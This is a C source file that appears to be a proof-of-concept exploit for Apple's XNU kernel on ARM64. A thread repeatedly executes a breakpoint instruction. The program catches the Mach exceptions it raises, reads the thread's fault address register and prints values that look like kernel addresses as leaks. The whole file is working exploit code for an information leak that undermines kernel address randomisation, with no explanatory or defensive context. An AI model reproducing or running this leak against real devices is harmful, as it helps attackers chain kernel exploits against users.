//
//  main.c
//  FAR_EL1_leak
//
//  Created by vsh on 11/12/23.
//

#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <mach/message.h>
#include <unistd.h>
#include <stdbool.h>
#include <mach/exc.h>


boolean_t ready_to_go = 0;
mach_port_t new_port = MACH_PORT_NULL;
pthread_t crashing_thread;

typedef struct {
    mach_msg_header_t header;
    char body[4096];
    mach_msg_trailer_t trailer;
} MachMessage;

void* crash_thread(void* arg) {
    while (ready_to_go == 0);
    while (true) {
        asm("brk #1");
    }
    return NULL;
}

mach_port_t start_crash_thread(void) {
    ready_to_go = 0;
    mach_port_t thread_port = MACH_PORT_NULL;
    kern_return_t kr;
    
    
    int ret = 0;
    ret = pthread_create(&crashing_thread, NULL, &crash_thread, NULL);
    if (ret != 0) {
        printf("[-] Failed to create crashing_thread\n");
        exit(-1);
    }

    thread_port = pthread_mach_thread_np(crashing_thread);
        
    kr = thread_set_exception_ports(thread_port, EXC_MASK_ALL, new_port, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) {
        printf("[-] thread_set_exception_port return: %x\n", kr);
        exit(-2);
    }
    
    ready_to_go = 1;
    
    return thread_port;
}

kern_return_t catch_exception_raise(mach_port_t port, mach_port_t failed_thread,
                                    mach_port_t task,
                                    exception_type_t exception,
                                    exception_data_t code,
                                    mach_msg_type_number_t code_count) {
  if (task != mach_task_self()) {
    return KERN_FAILURE;
  }
    return KERN_SUCCESS;
}


int main(int argc, const char * argv[]) {
    kern_return_t kr;
    arm_exception_state64_t old_state = {};
    mach_port_t thread_port = MACH_PORT_NULL;
    mach_msg_type_number_t old_stateCnt = ARM_EXCEPTION_STATE64_COUNT;
    
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &new_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_port_allocate return: %x\n", kr);
        exit(-1);
    }
    
    kr = mach_port_insert_right(mach_task_self(), new_port, new_port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_port_insert_right return: %x\n", kr);
        exit(-2);
    }
  
    thread_port = start_crash_thread();
    MachMessage message = {0};
    MachMessage reply = {0};
    uint64_t prev_leak_val = 0;
    uint64_t leak_val;

    while (1) {
        mach_msg_return_t ret = mach_msg(
            (mach_msg_header_t *)&message,  // msg
            MACH_RCV_MSG,                   // option
            0,                              // send size
            sizeof(message),                // receive size
            new_port,                      // recv_name
            MACH_MSG_TIMEOUT_NONE,          // timeout
            MACH_PORT_NULL);                // notify port
    
        if (ret != MACH_MSG_SUCCESS) {
            return ret;
        }
        
        kr = thread_get_state(thread_port, ARM_EXCEPTION_STATE64, (thread_state_t)&old_state, &old_stateCnt);
        if (kr != KERN_SUCCESS) {
            printf("[-] thread_get_state return: %x\n", kr);
            exit(-3);
        }
        
        leak_val = old_state.__far;
        
        if ((leak_val & (0xffffULL << 48)) == (0xffffULL << 48) && leak_val != prev_leak_val) {
            printf("[+] leak_val : 0x%016llx\n", leak_val);
            prev_leak_val = leak_val;
        }

        extern boolean_t exc_server(mach_msg_header_t* request,
                                    mach_msg_header_t* reply);
        exc_server((mach_msg_header_t*)&message, (mach_msg_header_t*)&reply);
        mach_msg(&(reply.header), MACH_SEND_MSG,
                         reply.header.msgh_size, 0, MACH_PORT_NULL,
                         MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    }
    return 0;
}
